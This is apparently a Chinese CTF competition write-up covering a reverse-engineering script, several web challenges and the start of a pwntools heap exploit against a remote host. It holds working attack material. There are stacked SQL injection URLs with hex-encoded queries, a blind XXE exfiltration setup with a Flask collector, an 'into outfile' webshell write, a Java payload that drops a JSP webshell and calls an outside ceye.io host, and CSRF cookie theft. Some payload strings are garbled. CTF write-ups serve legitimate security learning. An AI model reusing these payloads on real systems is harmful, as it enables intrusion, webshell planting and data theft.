    a = 'SSSSDDDWWWDDSSSSSAAAASSDDDDSSSDDWWWWDDDSSSSD'
    c = a.replace('W','0')
    c = c.replace('A','1')
    c = c.replace('S','2')
    c = c.replace('D','3')
    b = ['W','A','S','D']
    print(c)
    for i in range(len(c)):
          if( c[i] == '0'):
                print(b[eval(c[i])],end='')
                t=b[0]
                b[0]=b[2]
                b[2]=t
          if( c[i] == '1'):
                print(b[eval(c[i])],end='')
                t=b[0]
                b[0]=b[1]
                b[1]=b[2]
                b[2]=b[3]
                b[3]=t
          if( c[i] == '2'):
                print(b[eval(c[i])],end='')
                t=b[0]
                b[0]=b[2]
                b[2]=t
                t=b[1]
                b[1]=b[3]
                b[3]=t
          if( c[i] == '3'):
                print(b[eval(c[i])],end='')
                t=b[3]
                b[3]=b[2]
                b[2]=b[1]
                b[1]=b[0]
                b[0]=t
    结果：SWSWDSAADAWADADADSAWDADWASDADASDDADAWASWSWSD
SWSWDSAADAWADADADSAWDADWASDADASDDADAWASWSWSD的md5值为flag。
## web
###  sqli-labs 0
引号要二次url编码闭合,然后ban了select可以堆叠注入绕过
对了还有大小写问题
    http://118.31.11.216:30501/?id=1%2527;sEt @a=0x1; prEpare dump from @a;execute dump;
    select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x666c6167
    select group_concat(table_name) from information_schema.tables where table_schema=database()
    select * from information_schema.tables where table_schema=database() and table_name='uziuzi'* 
    select * from uziuzi
    //结果
    Your ID:information_schema,mysql,performance_schema,security 
    emails,referers,uagents,users,uziuzi 
    // 查flag
    http://118.31.11.216:30501/?id=1%2527;sEt%20@a=0x73656c656374202a2066726f6d20757a69757a69;%20prEpare%20dump%20from%20@a;execute%20dump;
###  白给的反序列化
真的白给,waf什么都不用绕
method 传mysys,args传[‘flag.php’]就出了
###  svgggggg!
svg是xml的,搜到了一个svg任意文件读的,但是这个没回显,开始自己构造盲打是xxe没成功,后来谷歌的一个别人构造的,成功读到文件
    //svg2
    %remote;%template;
       ]>&res;
    //test.xml
    ">
    //server.py
    //其一个flask方便看结果
    import requests
    from flask import Flask
    from flask import request
    import base64
    app = Flask(__name__)
    @app.route('/')
    def index():
        result = request.args.get('a', '').replace(' ', '+')
        print(result)
        print(base64.b64decode(result).decode())
        print('')
        return 'Hello World'
    app.run('0.0.0.0', port=3001)
    读用户,命令读出
    cd /app
    php -S 0.0.0.0:8080
    8080起了一个php
    用file读一下源码
    index
    Hi!
    You Find Me .
    Flag is nearby.
    1' union select 1,'',3 into outfile '/app/shell.php
    写shell进去,scandir列目录,file读flag
###  简单域渗透-flag1
参考
可以执行cmd,
    import java.io.FileWriter;
    public class LifExp {
    static {
    try {
        String payload = "");"        while((a=in.read(b))!=-1){"            out.println(new String(b));"        }"        out.print("");"    }"%>";
        FileWriter writer = new FileWriter("../webapps/ROOT/html/wendell.jsp");
        writer.write(payload);
        writer.close();
    String cmd = "ping wa.ik1fh0.ceye.io";
    java.lang.Runtime.getRuntime().exec(cmd).waitFor();
    } catch ( Exception e ) {
    e.printStackTrace();
    }
    }
    }
在web路径写一个jsp马,
然后桌面读出flag
###  fake phpminiadmin
给了提示是xxs
select 0x16进制绕过过滤,直接xss了
然后这个是post
CSRF构造一下
放在自己服务器
就可以打管理cookie
服务器的日志看到admin_shark.php页面
用上次安恒月赛的构造请求访问一下
拿到flag
###  babay waf
这里泄露的请求地址, 直接上guoke的车了
看到guoke.php大胆猜一下就是一句话,然后爆出来密码是1,
还看到,antproxy.php,蚁剑绕dis_func 剩下的2333
传大马,连上去直接搜出来flag
## pwn
###  heap_master
一开始没看出来是原题，largebin attack也不会（学堆的时候偷懒跳过了QAQ）
后来谷歌一搜，找了两篇exp，拼了一下，改了改打通嘞。
还有一篇是天枢的，一下子找不到了
exp:
    #!/usr/bin/python
    from pwn import *
    #from LibcSearcher import LibcSearcher
    context(arch='amd64')
    local=0
    binary_name='heap_master.bak'
    libc_name='libc.so.6'
    if local:
    ###    p=process("./"+binary_name)
        p=process(['./'+binary_name],env={'LD_PRELOAD':'./'+libc_name})
        e=ELF("./"+binary_name)
    ###    libc=e.libc
        libc=ELF("./libc.so.6")
    else:
        p=remote('118.31.11.216',30078)
        e=ELF("./"+binary_name)